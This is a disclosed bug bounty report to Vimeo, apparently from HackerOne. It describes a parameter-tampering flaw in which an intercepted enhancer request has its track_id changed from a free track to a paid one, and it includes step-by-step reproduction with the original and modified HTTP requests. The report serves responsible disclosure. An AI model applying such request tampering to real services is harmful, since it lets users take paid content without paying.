@@ -1,0 +1,36 @@
+ReportLink:https://hackerone.com/reports/50941
+WeaknessName:Privilege Escalation
+Reporter:https://hackerone.com/satishb3
+ReportedTo:Vimeo(vimeo)
+BountyAmount:250.0
+Severity:
+State:Closed
+DateOfDisclosure:14.10.2015 15:41:40
+
+Summary:
+
+It is possible to enhance videos with paid tracks without buying the track.
+
+Steps to verify:
+1. Log into vimeo.com and navigate to https://vimeo.com/enhancer.
+2. Click on any paid music track and note down the track id from the URL (ex: https://vimeo.com/musicstore/track/110272/talaky-instrumental-by-gayle-cloud : Track id is: 110272, cost: $1.99). 
+3. Back to the enhancer. Choose a free track (say, girl with a motory cycle track, id: 84469) and click on the video symbol to enhance video with this track.
+4. Choose the video to enhance. Click on Enhance button and intercept this request using burp proxy. Intercepted request looks like,
+
+    POST /enhancer HTTP/1.1
+    Host: vimeo.com
+    User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0
+    [...]
+
+    action=save&token=...&clip_id=118026546&track_id=84469&job_data=....
+
+5. Replace the track id in the above request with paid track value (say, 110272). Modified request looks like, 
+
+    POST /enhancer HTTP/1.1
+    Host: vimeo.com
+    User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0
+    [...]
+
+    action=save&token=..&clip_id=118026546&track_id=110272&job_data=...
+
+6. Send the modified request to the server. It creates the enhanced video with paid track without buying it.
